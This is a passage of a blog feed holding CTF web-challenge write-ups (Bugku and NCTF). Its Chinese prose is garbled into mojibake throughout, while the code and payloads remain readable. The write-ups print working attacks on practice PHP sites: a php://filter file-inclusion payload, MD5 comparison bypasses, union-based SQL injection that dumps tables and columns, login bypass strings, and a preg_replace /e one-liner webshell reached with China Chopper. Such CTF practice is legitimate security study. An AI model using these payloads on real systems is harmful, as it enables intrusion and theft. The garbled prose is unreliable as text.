title="flagåœ¨indexé‡Œ"></a>flagåœ¨indexé‡Œ</h2><p>é¢˜ç›®å·²ç»æç¤ºäº†flagçš„ä½ç½®åº”è¯¥åœ¨index.phpä¸­ï¼Œé‚£ä¹ˆè·å–index.phpçš„æºç å°±å¾ˆå…³é”®ï¼Œå¯æ˜¯æŸ¥çœ‹æºç ä»€ä¹ˆä¹Ÿæ²¡æœ‰</p><p>æ³¨æ„åˆ°äº†url:<a href="http://123.206.87.240:8005/post/index.php?file=show.php" target="_blank" rel="noopener">http://123.206.87.240:8005/post/index.php?file=show.php</a></p><p>å‡ºç°fileè¿™ä¸ªå‚æ•°ï¼Œæƒ³åˆ°äº†æ–‡ä»¶åŒ…å«çš„æ¼æ´</p><p>ç”¨ä¸‹é¢çš„payload,è·å–index.phpï¼Œæºç çš„base64å€¼</p><p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p><div class="hljs"><pre><code class="hljs llvm">PGh<span class="hljs-number">0</span>bWw+DQogICAgPHRpdGxlPkJ<span class="hljs-number">1</span>Z<span class="hljs-number">2</span>t<span class="hljs-number">1</span>LWN<span class="hljs-number">0</span>ZjwvdGl<span class="hljs-number">0</span>bGU+DQogICAgDQo<span class="hljs-number">8</span>P<span class="hljs-number">3</span>BocA<span class="hljs-number">0</span>KCWVycm<span class="hljs-number">9</span>yX<span class="hljs-number">3</span>JlcG<span class="hljs-number">9</span>ydGluZygwKTsNCglpZighJF<span class="hljs-number">9</span>HRVRbZmlsZV<span class="hljs-number">0</span>pe<span class="hljs-number">2</span>VjaG<span class="hljs-number">8</span>gJzxhIGhyZWY<span class="hljs-number">9</span>I<span class="hljs-keyword">i4</span>vaW<span class="hljs-number">5</span>kZXgucGhwP<span class="hljs-number">2</span>ZpbGU<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>hvdy<span class="hljs-number">5</span>waHAiPmNsaWNrIG<span class="hljs-number">1</span>lPyBubzwvYT<span class="hljs-number">4</span>nO<span class="hljs-number">30</span>NCgkkZmlsZT<span class="hljs-number">0</span>kX<span class="hljs-number">0</span>dFVFsnZmlsZSddOw<span class="hljs-number">0</span>KCWlmKHN<span class="hljs-number">0</span>cnN<span class="hljs-number">0</span>cigkZmlsZSwiL<span class="hljs-keyword">i4</span>vIil<span class="hljs-number">8</span>fHN<span class="hljs-number">0</span>cmlzdHIoJGZpbGUsICJ<span class="hljs-number">0</span>cCIpfHxzdHJpc<span class="hljs-number">3</span>RyKCRmaWxlLCJpbnB<span class="hljs-number">1</span>dCIpfHxzdHJpc<span class="hljs-number">3</span>RyKCRmaWxlLCJkYXRhIikpew<span class="hljs-number">0</span>KCQllY<span class="hljs-number">2</span>hvICJPaCBubyEiOw<span class="hljs-number">0</span>KCQlleGl<span class="hljs-number">0</span>KCk<span class="hljs-number">7</span>DQoJfQ<span class="hljs-number">0</span>KCWluY<span class="hljs-number">2</span><span class="hljs-keyword">x</span><span class="hljs-number">1</span>ZGUoJGZpbGUpOyANC<span class="hljs-keyword">i8</span>vZmxhZzpmbGFne<span class="hljs-number">2</span>VkdWxjbmlfZWxpZl<span class="hljs-number">9</span>sYWNvbF<span class="hljs-number">9</span>zaV<span class="hljs-number">9</span>zaWh<span class="hljs-number">0</span>fQ<span class="hljs-number">0</span>KPz<span class="hljs-number">4</span>NCjwvaHRtbD<span class="hljs-number">4</span>NCg==</code></pre></div><p>è§£ç ä¸º</p><div class="hljs"><pre><code class="hljs php+HTML">&lt;html&gt;    &lt;title&gt;Bugku-ctf&lt;&#x2F;title&gt;  &lt;?phperror_reporting(0);if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;$file&#x3D;$_GET[&#39;file&#39;];if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;echo &quot;Oh no!&quot;;exit();&#125;include($file); &#x2F;&#x2F;flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;&#x2F;html&gt;</code></pre></div><p>è·å–flag{edulcni_elif_lacol_si_siht}</p><h2 id="è¯·è¾“å…¥å¯†ç "><a href="#è¯·è¾“å…¥å¯†ç " class="headerlink" title="è¯·è¾“å…¥å¯†ç "></a>è¯·è¾“å…¥å¯†ç </h2><p>æç¤ºäº†5ä½æ•°çš„å¯†ç ï¼Œç›´æ¥çˆ†ç ´ï¼Œå¯ç”¨burpsuitçš„çˆ†ç ´æ¨¡å—</p><h2 id="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"><a href="#å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯" class="headerlink" title="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"></a>å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯</h2><p>æ‰“å¼€é¢˜ç›®åï¼Œå‡ºç°ä¸€æ®µä»£ç ï¼Œåº”è¯¥æ˜¯md5å€¼ï¼Œå¯æ˜¯è§£ç ä¸ºç©ºå¯†ç </p><p>æ‰«æç›®å½•<code>python dirsearch.py  -u http://123.206.87.240:8002/web16/ -e php</code></p><p><img src="https://i.loli.net/2020/11/30/QXP6HA2p4Ul5gaS.png" srcset="/img/loading.gif" alt></p><p>å‘ç°äº†<code>index.php.bak</code></p><blockquote><p>è¿™ä¸ªåº”è¯¥æ˜¯åœ¨ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œè‡ªåŠ¨ç”Ÿæˆçš„å¤‡ä»½æ–‡ä»¶ï¼›<br>EDITPLUS è¿™ç±»çš„æ–‡æœ¬ç¼–è¾‘å™¨åœ¨ç¼–è¾‘æ–‡ä»¶æ—¶ä¼šäº§ç”Ÿè¿™æ ·çš„å¤‡ä»½ï¼›<br>å¦‚æœç¼–è¾‘åæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼›<br>å¯ä»¥åˆ é™¤.BAKæ–‡ä»¶             (æ¥è‡ªç™¾åº¦)</p></blockquote><p>ä¸‹è½½.bakæ–‡ä»¶æ‰“å¼€åï¼Œå‘ç°æºç ï¼Œå¼€å§‹å®¡è®¡</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/**</span><span class="hljs-comment"></span><span class="hljs-comment"> * Created by PhpStorm.</span><span class="hljs-comment"> * User: Norse</span><span class="hljs-comment"> * Date: 2017/8/6</span><span class="hljs-comment"> * Time: 20:22</span><span class="hljs-comment">   */</span><span class="hljs-keyword">include_once</span> <span class="hljs-string">"flag.php"</span>;ini_set(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);$str = strstr($_SERVER[<span class="hljs-string">'REQUEST_URI'</span>], <span class="hljs-string">'?'</span>);$str = substr($str,<span class="hljs-number">1</span>);$str = str_replace(<span class="hljs-string">'key'</span>,<span class="hljs-string">''</span>,$str);<span class="hljs-comment">//å¯¹keyè¿›è¡Œäº†è¿‡æ»¤</span>parse_str($str);<span class="hljs-keyword">echo</span> md5($key1);<span class="hljs-keyword">echo</span> md5($key2);<span class="hljs-keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;<span class="hljs-comment">//è¿™é‡Œéœ€è¦ä½¿ç”¨md()å‡½æ•°å¯¹æ•°ç»„å¤„ç†æ—¶çš„æ¼æ´</span>    <span class="hljs-keyword">echo</span> $flag.<span class="hljs-string">"å–å¾—flag"</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>url:<code>http://123.206.87.240:8002/web16/index.php?kekeyy1[]=an&amp;kekeyy2[]=ss</code></p><p> å¯¹ä¸Šä¼ çš„å€¼è¿›è¡Œäº†è¿‡æ»¤key, kekeyyå¯ä»¥ç»•è¿‡</p><p> 1.md5å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå°†ä¸¤ä¸ªå‚æ•°è®¾ç½®ä¸ºæ•°ç»„ç±»å‹ç»è¿‡md5å‡½æ•°åŠ å¯†åéƒ½ä¸ºNULLæ•…äºŒè€…ç›¸ç­‰<br> payload:  <code>?kekey1[]=da&amp;kekey2[]=dada</code></p><p> 2.åˆ©ç”¨==æ¯”è¾ƒæ¼æ´</p><p> å¦‚æœä¸¤ä¸ªå­—ç¬¦ç»MD5åŠ å¯†åçš„å€¼ä¸º 0exxxxxå½¢å¼ï¼Œå°±ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸”è¡¨ç¤ºçš„æ˜¯0*10çš„xxxxæ¬¡æ–¹ï¼Œè¿˜æ˜¯é›¶ï¼Œéƒ½æ˜¯ç›¸ç­‰çš„ã€‚</p><p> ä¸‹åˆ—çš„å­—ç¬¦ä¸²çš„MD5å€¼éƒ½æ˜¯0eå¼€å¤´çš„ï¼š</p><div class="hljs"><pre><code>QNKCDZO240610708s878926199as155964671as214587387as214587387a</code></pre></div><h2 id="æˆç»©å•"><a href="#æˆç»©å•" class="headerlink" title="æˆç»©å•"></a>æˆç»©å•</h2><p>æ‰“å¼€é¡µé¢åƒæ˜¯æ³¨å…¥çš„é¢˜ç›®</p><p>æµ‹è¯•ä¸€äº›</p><div class="hljs"><pre><code class="hljs html">1' and 1=1 #      1' and 1=2 #</code></pre></div><p>   ç¬¬ä¸€ä¸ªè¯­å¥æ­£å¸¸ï¼Œç¬¬äºŒä¸ªè¯­å¥ä¸æ˜¾ç¤ºå†…å®¹ï¼Œå¯ä»¥åˆ¤æ–­å­˜åœ¨æ³¨å…¥ç‚¹</p><h3 id="1-åˆ¤æ–­å­—æ®µæ•°"><a href="#1-åˆ¤æ–­å­—æ®µæ•°" class="headerlink" title="1.åˆ¤æ–­å­—æ®µæ•°"></a>1.åˆ¤æ–­å­—æ®µæ•°</h3><div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">#</span></code></pre></div><h3 id="2-çˆ†æ•°æ®åº“"><a href="#2-çˆ†æ•°æ®åº“" class="headerlink" title="2.çˆ†æ•°æ®åº“"></a>2.çˆ†æ•°æ®åº“</h3><div class="hljs"><pre><code>-1&apos; union select 1,database(),3,4 #database:skctf_flag</code></pre></div><h3 id="3-çˆ†å‡ºè¡¨å"><a href="#3-çˆ†å‡ºè¡¨å" class="headerlink" title="3.çˆ†å‡ºè¡¨å"></a>3.çˆ†å‡ºè¡¨å</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # table:fl4g,sc</code></pre></div><h3 id="4-å­—æ®µå"><a href="#4-å­—æ®µå" class="headerlink" title="4.å­—æ®µå"></a>4.å­—æ®µå</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 # skctf_flag</code></pre></div><p> å¾—åˆ°flag</p><div class="hljs"><pre><code class="hljs clojure">(<span class="hljs-name">select</span> skctf_flag from skctf_flag.fl4g)</code></pre></div><h2 id="ç§‹åå±±è½¦ç¥"><a href="#ç§‹åå±±è½¦ç¥" class="headerlink" title="ç§‹åå±±è½¦ç¥"></a>ç§‹åå±±è½¦ç¥</h2><p>çœ‹åˆ°é¢˜ç›®å°±çŸ¥é“éœ€è¦ç”¨pythonçš„è„šæœ¬æ¥åš</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> reurl=<span class="hljs-string">'http://120.24.86.145:8002/qiumingshan/'</span>r=requests.session()requestpage = r.get(url)ans=re.findall(<span class="hljs-string">'&lt;div&gt;(.*?)=?;&lt;/div&gt;'</span>,requestpage.text)<span class="hljs-comment">#è·å–è¡¨è¾¾å¼</span>ans=<span class="hljs-string">""</span>.join(ans)<span class="hljs-comment">#åˆ—è¡¨è½¬ä¸ºå­—ç¬¦ä¸²</span>ans=ans[:<span class="hljs-number">-2</span>]<span class="hljs-comment">#å»æ‰æœ€åçš„=?</span>post=eval(ans)<span class="hljs-comment">#è®¡ç®—è¡¨è¾¾å¼çš„å€¼</span>data=&#123;<span class="hljs-string">'value'</span>:post&#125;<span class="hljs-comment">#æ„é€ postçš„dataéƒ¨åˆ†</span>flag=r.post(url,data=data)print(flag.text)</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>md5</tag>
      
      <tag>sql</tag>
      
      <tag>å¼±ç±»å‹</tag>
      
      <tag>åŸŸåè§£æ</tag>
      
      <tag>çˆ†ç ´</tag>
      
      <tag>è„šæœ¬</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç»¼åˆ2</title>
    <link href="/2020/09/03/%E7%BB%BC%E5%90%882/"/>
    <url>/2020/09/03/%E7%BB%BC%E5%90%882/</url>
    
    <content type="html"><![CDATA[<h1 id="NCTF-ç»¼åˆ2"><a href="#NCTF-ç»¼åˆ2" class="headerlink" title="NCTF-ç»¼åˆ2"></a>NCTF-ç»¼åˆ2</h1><a id="more"></a><p>è¿›å…¥é¡µé¢ï¼Œæ²¡ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹ï¼Œéšä¾¿ç‚¹ç‚¹</p><p><img src="https://i.loli.net/2020/11/30/9Vf7JA3OWC68arb.png" srcset="/img/loading.gif" alt></p><p>ç•™è¨€å¯ä»¥æ­£å¸¸æäº¤ï¼Œæœ¬ä»¥ä¸ºæœ‰xss,ä½†æ˜¯å·²ç»æç¤ºä¸æ˜¯xss</p><p>çœ‹åˆ°æœ€ä¸‹é¢æœ‰ä¸ªç½‘ç«™è¯´æ˜   <a href="http://cms.nuptzj.cn/about.php?file=sm.txt" target="_blank" rel="noopener">æœ¬CMSè¯´æ˜</a>  ï¼Œæœ‰ç”¨çš„å†…å®¹å¦‚ä¸‹</p><blockquote><p>config.phpï¼šå­˜æ”¾æ•°æ®åº“ä¿¡æ¯ï¼Œç§»æ¤æ­¤CMSæ—¶è¦ä¿®æ”¹ </p><p>index.phpï¼šä¸»é¡µæ–‡ä»¶ </p><p>passencode.phpï¼šFunnyå…¬å¸è‡ªå†™å¯†ç åŠ å¯†ç®—æ³•åº“ </p><p>say.phpï¼šç”¨äºæ¥æ”¶å’Œå¤„ç†ç”¨æˆ·ç•™è¨€è¯·æ±‚ </p><p>sm.txtï¼šæœ¬CMSçš„è¯´æ˜æ–‡æ¡£ saeçš„information_schemaè¡¨å¥½åƒæ²¡æ³•æ£€ç´¢</p><p>adminè¡¨ç»“æ„ create table admin ( id integer, username text, userpass text, )  </p></blockquote><p> <code>http://cms.nuptzj.cn/about.php?file=sm.txt</code>å¯ä»¥ä½¿ç”¨phpä¼ªåè®®ä»»æ„è¯»å–æ–‡ä»¶å†…å®¹ã€‚ åŒ…æ‹¬è‡ªå·±</p><p>å°è¯•è¯»å–index.phpçš„æºç ï¼Œå‘ç°å¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨</p><p>è¯»å–<code>about.php</code></p><div class="hljs"><pre><code class="hljs php+HTML">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;&lt;?php$file&#x3D;$_GET[&#39;file&#39;];if($file&#x3D;&#x3D;&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123;   &#x2F;&#x2F; æœ‰config.phpecho &quot;fileå‚æ•°ä¸èƒ½ä¸ºç©ºï¼&quot;;exit();&#125;else&#123;$cut&#x3D;strchr($file,&quot;loginxlcteam&quot;);   &#x2F;&#x2F;åŒ…å«äº† loginxlcteamé¡µé¢if($cut&#x3D;&#x3D;false)&#123;$data&#x3D;file_get_contents($file);$date&#x3D;htmlspecialchars($data);echo $date;&#125;else&#123;echo &quot;&lt;script&gt;alert(&#39;æ•æ„Ÿç›®å½•ï¼Œç¦æ­¢æŸ¥çœ‹ï¼ä½†æ˜¯ã€‚ã€‚ã€‚&#39;)&lt;&#x2F;script&gt;&quot;;&#125;&#125;</code></pre></div><p>è¯»å–config.phpï¼Œæ— æœ‰ç”¨ä¿¡æ¯</p><p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/2.png" srcset="/img/loading.gif" alt></p><p>æŸ¥çœ‹<code>loginxlcteam</code>,æ˜¯ä¸ªç™»å½•é¡µé¢</p><p><img src="https://i.loli.net/2020/12/04/LfWepcHgMhxl8AF.png" srcset="/img/loading.gif" alt></p><p>åˆ°æ­¤è¿˜æ˜¯æ— ä»ä¸‹æ‰‹ï¼Œå‚è€ƒå¤§ä½¬çš„åšå®¢ <a href="https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase</a> </p><p>åœ¨æœç´¢é¡µé¢ä¸­ä¹Ÿå­˜åœ¨æœ‰ç”¨ä¿¡æ¯</p><p> <code>http://cms.nuptzj.cn/about.php?file=so.php</code>è·å–æºç </p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">//so.php</span><span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">'HTTP_USER_AGENT'</span>]!=<span class="hljs-string">"Xlcteam Browser"</span>)&#123;     <span class="hljs-comment">//å¿…é¡»ä¿®æ”¹httpå¤´ï¼Œå§user-agentæ”¹æˆXlcteam Browser</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'ä¸‡æ¶æ»´é»‘é˜”ï¼Œæœ¬åŠŸèƒ½åªæœ‰ç”¨æœ¬å…¬å¸å¼€å‘çš„æµè§ˆå™¨æ‰å¯ä»¥ç”¨å–”~'</span>;    <span class="hljs-keyword">exit</span>();&#125;$id=$_POST[<span class="hljs-string">'soid'</span>];<span class="hljs-comment">//post ä¸€ä¸ªsoid</span><span class="hljs-keyword">include</span> <span class="hljs-string">'config.php'</span>;<span class="hljs-keyword">include</span> <span class="hljs-string">'antiinject.php'</span>;   <span class="hljs-comment">//é˜²æ³¨å…¥çš„æ–‡ä»¶</span><span class="hljs-keyword">include</span> <span class="hljs-string">'antixss.php'</span>;      <span class="hljs-comment">//é˜²xssçš„æ–‡ä»¶</span>$id=antiinject($id);<span class="hljs-comment">//å¯¹idè¿‡æ»¤</span>$con = mysql_connect($db_address,$db_user,$db_pass) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"ä¸èƒ½è¿æ¥åˆ°æ•°æ®åº“ï¼ï¼"</span>.mysql_error());mysql_select_db($db_name,$con);$id=mysql_real_escape_string($id);$result=mysql_query(<span class="hljs-string">"SELECT * FROM `message` WHERE display=1 AND id=$id"</span>);  <span class="hljs-comment">//sqlæŸ¥è¯¢ï¼Œå¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹</span>$rs=mysql_fetch_array($result);<span class="hljs-keyword">echo</span> htmlspecialchars($rs[<span class="hljs-string">'nice'</span>]).<span class="hljs-string">':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>.antixss($rs[<span class="hljs-string">'say'</span>]).<span class="hljs-string">'&lt;br /&gt;'</span>;mysql_free_result($result);mysql_free_result($file);mysql_close($con);<span class="hljs-meta">?&gt;</span></code></pre></div><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-comment">//antiinject.phpæºç </span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">antiinject</span><span class="hljs-params">($content)</span></span><span class="hljs-function"> </span>&#123;  $keyword=<span class="hljs-keyword">array</span>(<span class="hljs-string">"select"</span>,<span class="hljs-string">"union"</span>,<span class="hljs-string">"and"</span>,<span class="hljs-string">"from"</span>,<span class="hljs-string">' '</span>,<span class="hljs-string">"'"</span>,<span class="hljs-string">";"</span>,<span class="hljs-string">'"'</span>,<span class="hljs-string">"char"</span>,<span class="hljs-string">"or"</span>,<span class="hljs-string">"count"</span>,<span class="hljs-string">"master"</span>,<span class="hljs-string">"name"</span>,<span class="hljs-string">"pass"</span>,<span class="hljs-string">"admin"</span>,<span class="hljs-string">"+"</span>,<span class="hljs-string">"-"</span>,<span class="hljs-string">"order"</span>,<span class="hljs-string">"="</span>); <span class="hljs-comment">//å¯¹ä¸€äº›sqlæ³¨å…¥æ—¶ç”¨åˆ°çš„å…³é”®è¯è¿›è¡Œäº†è¿‡æ»¤</span>     $info=strtolower($content);  <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;=count($keyword);$i++) &#123;  $info=str_replace($keyword[$i], <span class="hljs-string">''</span>,$info);  &#125;  <span class="hljs-keyword">return</span> $info;  &#125;  <span class="hljs-meta">?&gt;</span></code></pre></div><p>å¤§è‡´æ„æ€å°±æ˜¯</p><p>1.åˆ¤æ–­httpè¯·æ±‚å¤´ä¸­çš„user-agentå‚æ•°æ˜¯å¦ä¸ºXlcteam Browser</p><p>2.postå‚æ•°soid</p><p>3.å¯¹soidè¿›è¡Œè¿‡æ»¤åå¸¦å…¥sqlè¯­å¥ä¸­æŸ¥è¯¢</p><p>äºæ˜¯æŠ“åŒ…ä¿®æ”¹user-agent</p><p>ç¡®å®šå­˜åœ¨æ³¨å…¥ç‚¹</p><p><img src="https://i.loli.net/2020/11/30/KGcINOm5XAxVhDE.png" srcset="/img/loading.gif" alt></p><p>ç”±äºä¹‹å‰æç¤ºäº†<strong>adminè¡¨ç»“æ„ create table admin ( id integer, username text, userpass text, )</strong>  </p><p>å¯ç›´æ¥å†™å‡ºæŸ¥è¯¢è¯­å¥</p><div class="hljs"><pre><code class="hljs reasonml">(sselectelect<span class="hljs-comment">/**/</span>group<span class="hljs-constructor">_concat(<span class="hljs-params">userppassass</span>)</span><span class="hljs-comment">/**/</span>ffromrom<span class="hljs-comment">/**/</span>aadmindmin)</code></pre></div><p><img src="https://i.loli.net/2020/11/30/wMtHrAcuYVWOn91.png" srcset="/img/loading.gif" alt></p><p>ASCIIç è½¬å­—ç¬¦ä¸²ç»“æœä¸ºï¼š fuckruntu </p><p>ç™»å½•</p><p><img src="https://i.loli.net/2020/11/30/qZmL6EeW8O3MsYX.png" srcset="/img/loading.gif" alt></p><p> <strong><a href="http://cms.nuptzj.cn/about.php?file=xlcteam.php" target="_blank" rel="noopener">http://cms.nuptzj.cn/about.php?file=xlcteam.php</a></strong>  æŸ¥çœ‹æºç </p><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> $e = $_REQUEST[<span class="hljs-string">'www'</span>]; $arr = <span class="hljs-keyword">array</span>($_POST[<span class="hljs-string">'wtf'</span>] =&gt; <span class="hljs-string">'|.*|e'</span>,); array_walk($arr, $e, <span class="hljs-string">''</span>); <span class="hljs-meta">?&gt;</span></code></pre></div><p>çœ‹æ ·å­æ˜¯å¯ä»¥ç”¨èœåˆ€è¿æ¥çš„</p><p> é‚£æ€ä¹ˆåˆ©ç”¨å°é©¬å‘¢ï¼Œæ•°ç»„çš„valueä¸­æ˜¯|.*|eï¼Œè¿™é‡Œç”¨åˆ°äº†æ­£åˆ™åŒ¹é…çš„preg_replace()çš„ä¸€ä¸ªæ¼æ´ï¼š<br>å‚è€ƒ<a href="https://www.jb51.net/article/38714.htm" target="_blank" rel="noopener">https://www.jb51.net/article/38714.htm</a><br>ç®€å•æ¥è¯´å°±æ˜¯æ­£åˆ™ä¸­/e(è¿™é‡Œå’Œ|eæ•ˆæœä¸€æ ·) ä¿®æ­£ç¬¦ä½¿ preg_replace() å°† replacement å‚æ•°å½“ä½œ PHP ä»£ç ï¼ˆåœ¨é€‚å½“çš„é€†å‘å¼•ç”¨æ›¿æ¢å®Œä¹‹åï¼‰ã€‚æç¤ºï¼šè¦ç¡®ä¿ replacement æ„æˆä¸€ä¸ªåˆæ³•çš„ PHP ä»£ç å­—ç¬¦ä¸²ï¼Œå¦åˆ™ PHP ä¼šåœ¨æŠ¥å‘Šåœ¨åŒ…å« preg_replace() çš„è¡Œä¸­å‡ºç°è¯­æ³•è§£æé”™è¯¯ã€‚<br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ é€’preg_replaceç»™wwwï¼Œè¿™æ ·arrayä¸­çš„å€¼å°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œé”®å°±æ˜¯ç¬¬äºŒä¸ªå‚æ•°ï¼Œæ­£å¥½å¯ä»¥åˆ©ç”¨preg_replaceçš„æ¼æ´ï¼Œç„¶åä¼šæ‰§è¡Œ$_POST[â€˜wtfâ€™]ï¼Œå°±ç›¸å½“äºä¸€ä¸ªä¸€å¥è¯é©¬äº†ã€‚<br>ç”¨èœåˆ€è¿æ¥ï¼š </p><p>url:<a href="http://cms.nuptzj.cn/xlcteam.php?www=preg_replace" target="_blank" rel="noopener">http://cms.nuptzj.cn/xlcteam.php?www=preg_replace</a></p><p>å¯†ç ï¼šwtf</p><p><strong>æ€»ç»“ï¼šç®—æ˜¯ä¸€é“æ¯”è¾ƒéš¾çš„é¢˜ç›®äº†ï¼Œæ¶‰åŠåˆ°çŸ¥è¯†ç‚¹ä¹Ÿå¾ˆå¤šï¼Œè¿˜éœ€è¦å¤šçœ‹çœ‹ï¼ï¼ï¼</strong></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>php</tag>
      
      <tag>shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nctf-2</title>
    <link href="/2020/09/02/nctf-2/"/>
    <url>/2020/09/02/nctf-2/</url>
    
    <content type="html"><![CDATA[<h1 id="NCTF-2"><a href="#NCTF-2" class="headerlink" title="NCTF-2"></a>NCTF-2</h1><a id="more"></a><h2 id="SQLæ³¨å…¥1"><a href="#SQLæ³¨å…¥1" class="headerlink" title="SQLæ³¨å…¥1"></a>SQLæ³¨å…¥1</h2><p>é¢˜ç›®æºç ç»™å‡º</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;    mysql_connect(SAE_MYSQL_HOST_M . <span class="hljs-string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);  mysql_select_db(SAE_MYSQL_DB);  $user = trim($_POST[user]);  $pass = md5(trim($_POST[pass]));  $sql=<span class="hljs-string">"select user from ctf where (user='"</span>.$user.<span class="hljs-string">"') and (pw='"</span>.$pass.<span class="hljs-string">"')"</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;/br&gt;'</span>.$sql;  $query = mysql_fetch_array(mysql_query($sql));  <span class="hljs-keyword">if</span>($query[user]==<span class="hljs-string">"admin"</span>) &#123;      <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;  &#125;  <span class="hljs-keyword">if</span>($query[user] != <span class="hljs-string">"admin"</span>) &#123;    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);  &#125;&#125;<span class="hljs-keyword">echo</span> $query[user];<span class="hljs-meta">?&gt;</span></code></pre></div><p>é¦–å…ˆpostæ–¹æ³•ä¼ é€’userå’Œpassä¸¤ä¸ªå‚æ•°ï¼Œç„¶åå¸¦å…¥sqlè¯­å¥ä¸­æŸ¥è¯¢</p><p>æ³¨å…¥ç‚¹åœ¨è¿™ä¸ªä½ç½®</p><p><code>$sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;</code></p><p><code>select user from ctf where (user=&#39;&#39;) and (pw=&#39;&#39;)</code></p><p>æ„é€ è¯­å¥</p><p><code>select user from ctf where (user=&#39;admin&#39;) or 1=1 #)   and (pw=&#39;&#39;)</code> </p><p>åœ¨usernameä¸­å¡«å…¥<code>admin&#39;) or 1=1 #</code>æˆ–è€…<code>admin&#39;) and 1=1 #</code>ï¼Œæäº¤å³å¯è·å¾—flag</p><h2 id="passcheck"><a href="#passcheck" class="headerlink" title="passcheck"></a>passcheck</h2><div class="hljs"><pre><code class="hljs php">$pass=@$_POST[<span class="hljs-string">'pass'</span>];$pass1=***********;<span class="hljs-comment">//è¢«éšè—èµ·æ¥çš„å¯†ç </span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($pass))&#123;<span class="hljs-keyword">if</span>(@!strcmp($pass,$pass1))&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag:nctf&#123;*&#125;"</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"the pass is wrong!"</span>;&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"please input pass!"</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>strcmp() 